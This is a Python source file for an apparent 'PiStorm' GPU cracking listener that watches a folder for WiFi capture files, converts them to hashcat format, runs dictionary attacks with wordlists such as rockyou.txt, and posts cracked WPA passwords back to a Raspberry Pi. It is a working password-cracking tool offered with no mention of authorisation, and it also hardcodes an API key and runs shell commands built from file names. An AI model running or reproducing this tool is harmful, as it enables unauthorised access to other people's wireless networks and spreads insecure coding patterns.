#!/usr/bin/env python3
"""
PiStorm Windows GPU Crack Listener
GPU-accelerated WiFi password cracking station for PiStorm platform
"""

import os
import time
import json
import logging
import hashlib
import subprocess
import requests
from pathlib import Path
from datetime import datetime
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# Configuration
INCOMING_DIR = Path.home() / "wifi-crack-pc" / "incoming"
WORDLISTS_DIR = Path.home() / "wifi-crack-pc" / "wordlists"
RESULTS_DIR = Path.home() / "wifi-crack-pc" / "results"
LOGS_DIR = Path.home() / "wifi-crack-pc" / "logs"

# Pi Configuration
PI_IP = "192.168.0.218"
PI_PORT = 5000
PI_API_KEY = "4c273a289160db43476e823cfedc262578a7b96407c4728f4ecb24aad86c776f"

# Hashcat Configuration for RTX 4070 Super
HASHCAT_WORKLOAD = 3  # High workload
HASHCAT_OPTIMIZE = True
HASHCAT_FORCE = True

# Create directories
for directory in [INCOMING_DIR, WORDLISTS_DIR, RESULTS_DIR, LOGS_DIR]:
    directory.mkdir(parents=True, exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOGS_DIR / 'crack_listener.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class CrackHandler(FileSystemEventHandler):
    def __init__(self):
        self.setup_wordlists()
        self.verify_tools()
    
    def setup_wordlists(self):
        """Find and prioritize wordlists"""
        self.wordlists = []
        
        # Priority order for WiFi cracking
        priority_lists = [
            "wifi-wpa-probable.txt",
            "rockyou.txt", 
            "probable-v2-wpa-top4800.txt",
            "fasttrack.txt",
            "common-passwords.txt"
        ]
        
        # Add priority lists first
        for wordlist in priority_lists:
            path = WORDLISTS_DIR / wordlist
            if path.exists():
                self.wordlists.append(path)
                logger.info(f"Found priority wordlist: {wordlist}")
        
        # Add any other .txt files
        for path in WORDLISTS_DIR.glob("*.txt"):
            if path not in self.wordlists:
                self.wordlists.append(path)
                logger.info(f"Found additional wordlist: {path.name}")
        
        logger.info(f"Total wordlists available: {len(self.wordlists)}")
    
    def verify_tools(self):
        """Verify required tools are available"""
        # Check hashcat
        try:
            result = subprocess.run(["hashcat", "--version"], capture_output=True, text=True)
            if result.returncode == 0:
                logger.info("[OK] Hashcat found")
            else:
                logger.error("[ERROR] Hashcat not working")
        except FileNotFoundError:
            logger.error("[ERROR] Hashcat not found in PATH")
        
        # Check conversion tools
        conversion_tools = [
            "hcxpcapngtool",
            "wsl hcxpcapngtool", 
            "cap2hccapx",
            "aircrack-ng"
        ]
        
        tool_found = False
        for tool in conversion_tools:
            try:
                result = subprocess.run(tool.split() + ["--version"], capture_output=True)
                if result.returncode == 0:
                    logger.info(f"[OK] Conversion tool found: {tool}")
                    tool_found = True
                    break
            except FileNotFoundError:
                continue
        
        if not tool_found:
            logger.warning("[WARNING] No conversion tools found - may limit functionality")
    
    def on_created(self, event):
        if event.is_file and event.src_path.endswith(('.cap', '.pcap')):
            self.process_capture_file(event.src_path)
    
    def process_capture_file(self, cap_file):
        """Process new capture file with GPU acceleration"""
        cap_path = Path(cap_file)
        session_name = f"pistorm_{int(time.time())}"
        
        logger.info(f"🔥 GPU Processing capture: {cap_path.name}")
        
        # Send status update to Pi
        self.update_pi_status("gpu_ready", 0, cap_path.name)
        
        try:
            # Try conversion to hashcat format
            converted_file = self.convert_capture_file(cap_path)
            
            if not converted_file:
                logger.warning("No conversion tools found, attempting direct processing")
                converted_file = cap_path
            
            # Process with each wordlist until success
            total_wordlists = len(self.wordlists)
            
            for i, wordlist in enumerate(self.wordlists):
                progress = int(10 + (i / total_wordlists) * 80)  # 10-90% range
                
                self.update_pi_status("gpu_cracking", progress, cap_path.name)
                logger.info(f"🚀 GPU Processing with wordlist: {wordlist.name}")
                
                result = self.run_hashcat(converted_file, wordlist, session_name)
                
                if result:
                    logger.info(f"🎉 Password cracked: {result}")
                    self.update_pi_status("completed", 100, cap_path.name)
                    self.send_result_to_pi(cap_path.stem, result)
                    return
                else:
                    logger.info(f"No passwords found with {wordlist.name}")
            
            # No password found
            logger.info(f"🔍 GPU processing complete - No passwords cracked for {cap_path.name}")
            self.update_pi_status("completed", 100, cap_path.name)
            self.send_result_to_pi(cap_path.stem, "NOT FOUND")
            
        except Exception as e:
            logger.error(f"GPU processing error: {e}")
            self.send_result_to_pi(cap_path.stem, "ERROR")
    
    def convert_capture_file(self, cap_file):
        """Convert capture file to hashcat format"""
        base_name = cap_file.stem
        output_formats = [
            (RESULTS_DIR / f"{base_name}.22000", "22000"),
            (RESULTS_DIR / f"{base_name}.hccapx", "hccapx"),
            (RESULTS_DIR / f"{base_name}.netntlm", "netntlm")
        ]
        
        # Try different conversion tools
        conversion_commands = [
            f"hcxpcapngtool -o {{output}} {cap_file}",
            f"wsl hcxpcapngtool -o {{output}} {cap_file}",
            f"cap2hccapx {cap_file} {{output}}",
            f"aircrack-ng -J {base_name} {cap_file}"
        ]
        
        for output_file, format_type in output_formats:
            for cmd_template in conversion_commands:
                try:
                    cmd = cmd_template.format(output=output_file)
                    logger.info(f"Trying conversion: {cmd}")
                    
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
                    
                    if result.returncode == 0 and output_file.exists() and output_file.stat().st_size > 0:
                        logger.info(f"✅ Conversion successful: {output_file}")
                        return output_file
                    else:
                        logger.warning(f"{cmd} failed: {result.stderr}")
                        
                except Exception as e:
                    logger.warning(f"Conversion attempt failed: {e}")
                    continue
        
        logger.warning("All conversion attempts failed")
        return None
    
    def run_hashcat(self, target_file, wordlist, session):
        """Run hashcat with GPU acceleration"""
        
        # Determine hashcat mode based on file extension
        if str(target_file).endswith('.22000'):
            mode = "22000"  # WPA-PBKDF2-PMKID+EAPOL
        elif str(target_file).endswith('.hccapx'):
            mode = "2500"   # WPA/WPA2
        else:
            # Try multiple modes for .cap files
            modes = ["22000", "2500", "22001"]  # WPA3 support
            for mode in modes:
                result = self._run_hashcat_mode(target_file, wordlist, session, mode)
                if result:
                    return result
            return None
        
        return self._run_hashcat_mode(target_file, wordlist, session, mode)
    
    def _run_hashcat_mode(self, target_file, wordlist, session, mode):
        """Run hashcat with specific mode"""
        
        cmd = [
            "hashcat",
            "-m", mode,
            "-a", "0",  # Dictionary attack
            "-w", str(HASHCAT_WORKLOAD),
            "--session", f"{session}_{mode}",
            str(target_file),
            str(wordlist)
        ]
        
        if HASHCAT_OPTIMIZE:
            cmd.append("-O")
        
        if HASHCAT_FORCE:
            cmd.append("--force")
        
        # Add status updates
        cmd.extend(["--status", "--status-timer=10"])
        
        logger.info(f"💻 GPU Command: hashcat -m {mode} -O -w {HASHCAT_WORKLOAD} [file] {wordlist.name}")
        
        try:
            # Run hashcat
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Check for successful crack
            if "Status...........: Cracked" in result.stdout:
                return self.extract_password(target_file, mode)
            elif result.returncode == 0:
                logger.info(f"Hashcat completed successfully but no password found")
                return None
            else:
                logger.warning(f"Hashcat failed with mode {mode}: {result.stderr}")
                return None
                
        except subprocess.TimeoutExpired:
            logger.warning(f"Hashcat timeout with mode {mode}")
            return None
        except Exception as e:
            logger.error(f"Hashcat error with mode {mode}: {e}")
            return None
    
    def extract_password(self, target_file, mode):
        """Extract cracked password from hashcat"""
        try:
            # Use hashcat --show to get the password
            cmd = ["hashcat", "--show", "-m", mode, str(target_file)]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0 and result.stdout.strip():
                # Parse output: hash:password
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if ':' in line:
                        password = line.split(':')[-1].strip()
                        if password:
                            return password
            
            return None
            
        except Exception as e:
            logger.error(f"Error extracting password: {e}")
            return None
    
    def update_pi_status(self, status, progress, filename):
        """Send status update to Pi"""
        try:
            url = f"http://{PI_IP}:{PI_PORT}/gpu_status"
            headers = {"X-API-Key": PI_API_KEY, "Content-Type": "application/json"}
            data = {
                "status": status,
                "progress": progress,
                "filename": filename,
                "timestamp": datetime.now().isoformat(),
                "gpu_info": "RTX 4070 Super"
            }
            
            response = requests.post(url, json=data, headers=headers, timeout=5)
            if response.status_code != 200:
                logger.warning(f"Pi status update failed: {response.status_code}")
                
        except Exception as e:
            logger.warning(f"Failed to update Pi status: {e}")
    
    def send_result_to_pi(self, target, password):
        """Send cracking result back to Pi"""
        try:
            url = f"http://{PI_IP}:{PI_PORT}/crack_result"
            headers = {"X-API-Key": PI_API_KEY, "Content-Type": "application/json"}
            data = {
                "target": target,
                "password": password,
                "timestamp": datetime.now().isoformat(),
                "cracked_by": "windows-gpu-rtx4070",
                "processing_time": time.time(),
                "wordlists_tried": len(self.wordlists)
            }
            
            response = requests.post(url, json=data, headers=headers, timeout=10)
            
            if response.status_code == 200:
                logger.info(f"✅ Result sent to Pi successfully")
            else:
                logger.error(f"❌ Failed to send result to Pi: {response.status_code}")
            
        except Exception as e:
            logger.error(f"❌ Error sending result to Pi: {e}")

def main():
    print("=== 🚀 PiStorm GPU Listener - Windows PC ===")
    print("🔥 GPU: RTX 4070 Super Ready for Distributed Processing")
    print(f"📁 Monitoring: {INCOMING_DIR}")
    print(f"📚 Wordlists: {WORDLISTS_DIR}")
    print(f"📊 Results: {RESULTS_DIR}")
    print(f"🌐 Pi API: {PI_IP}:{PI_PORT}")
    print(f"🔑 Authenticated: API Key configured")
    print("=" * 50)
    
    # Test Pi connectivity
    try:
        response = requests.get(f"http://{PI_IP}:{PI_PORT}/ping", timeout=5)
        if response.status_code == 200:
            logger.info("✅ Pi connectivity verified")
        else:
            logger.warning("⚠️ Pi responded but with error")
    except:
        logger.warning("⚠️ Cannot reach Pi - continuing anyway")
    
    # Setup file watcher
    event_handler = CrackHandler()
    observer = Observer()
    observer.schedule(event_handler, str(INCOMING_DIR), recursive=False)
    observer.start()
    
    logger.info(f"Started monitoring {INCOMING_DIR}")
    logger.info("Waiting for capture files... (Ctrl+C to stop)")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Stopping listener...")
        observer.stop()
    observer.join()
    logger.info("Listener stopped")

if __name__ == "__main__":
    main()